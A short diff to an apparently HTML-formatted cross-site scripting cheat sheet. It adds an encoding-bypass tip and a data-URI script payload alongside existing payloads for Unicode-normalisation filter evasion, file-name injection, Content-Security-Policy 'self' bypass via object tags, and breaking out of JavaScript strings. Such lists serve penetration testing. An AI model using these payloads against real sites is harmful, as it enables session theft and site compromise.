@@ -68,6 +68,7 @@ Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transform
 E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ <br>
 %EF%BC%9E becomes > <br>
 %EF%BC%9C becomes < <br>
+ Try UTF-7, UTF-8 UTF-16BE, UTF-32 encoding
  <br>
  <h3> File Upload XSS </h3><br>
  If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
@@ -78,6 +79,7 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
  This will work for script-src self: <br>
  <.object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object.> <br>
  <.object data="javascript:alert(1)".> (firefox) <br>
+ <.script src="data:,alert(1)">/<./script>
 <br>
  <h3> XSS within Variables and scripts</h3>
  '-alert(1)-' (if backslash escaped use the payload below) <br> 
